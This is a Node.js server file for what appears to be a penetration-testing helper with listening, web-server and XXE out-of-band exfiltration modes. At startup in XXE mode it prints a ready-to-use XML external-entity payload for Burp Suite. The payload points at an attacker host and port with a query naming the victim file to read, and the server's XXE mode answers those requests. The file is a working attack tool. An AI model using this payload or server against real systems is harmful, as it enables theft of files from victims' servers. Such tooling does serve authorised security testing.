const http = require('http');

const Modes = require('./modes.js');
const RequestParser = require('./request-parser.js');
const Settings = require('./settings.js');

// ##################################
// #
// #  HTTP SERVER
// #
// ##################################
http.createServer((req, res) => {

    const parsedRequest = RequestParser.parseRequest(req);
    parsedRequest.then((result) => {

        switch (Settings.ApplicationMode) {
            case Modes.Types.LISTENING_MODE:
                Modes.ListeningMode.execute(result);
                res.statusCode = 200;
                res.setHeader('Content-Type', 'text/html');
                res.end(`OK\n`);
                break;

            case Modes.Types.WEB_SERVER_MODE:
                let htmlPage = Modes.WebServerMode.execute(result);
                res.statusCode = 200;
                res.setHeader('Content-Type', 'text/html');
                res.end(htmlPage);
                break;
            
            case Modes.Types.XXE_OOB_MODE:
                let fileContent = Modes.XXEOOBMode.execute(result);
                res.setHeader('Content-Type', 'text/html');
                res.end(fileContent);
        
            default:
                Modes.ListeningMode.execute(result);
                break;
        }


    });

}).listen(Settings.ListenPort, Settings.ListenIPAddres, () => {
    console.log(`Current Application Mode is: ${Settings.ApplicationMode}`);
    console.log(`Server listening on ${Settings.ListenIPAddres}:${Settings.ListenPort}...`);

    switch(Settings.ApplicationMode) {
        case Modes.Types.XXE_OOB_MODE:
            console.log(`
            
            The payload to inject in Burpsuite XML request is:

            <!DOCTYPE xxe [ 
                <!ENTITY % EvilDTD SYSTEM 'http://<ATTACKER-IP>:<ATTACKER-PORT>/XXE-OOB?fileToRead=<FULL-ABSOLUTE-PATH-TO-VICTIM-FILE'>
                %EvilDTD;
                %LoadOOBEntity;
                %OOB;
            ]>
                `);
            break;
    }


});
